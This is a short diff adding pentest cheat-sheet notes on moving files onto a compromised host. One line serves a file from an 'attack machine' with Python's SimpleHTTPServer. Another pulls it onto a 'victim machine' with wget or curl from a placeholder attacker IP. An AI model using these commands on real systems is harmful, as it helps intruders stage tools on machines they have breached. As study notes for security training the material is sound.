@@ -1,0 +1,8 @@
+# host file on attack machine
+python -m SimpleHTTPServer 80
+
+# on victim machine
+wget http://[attack IP]/[file] -O [file save as]
+
+# OR
+curl http://[attack IP]/[file] > [file save as]
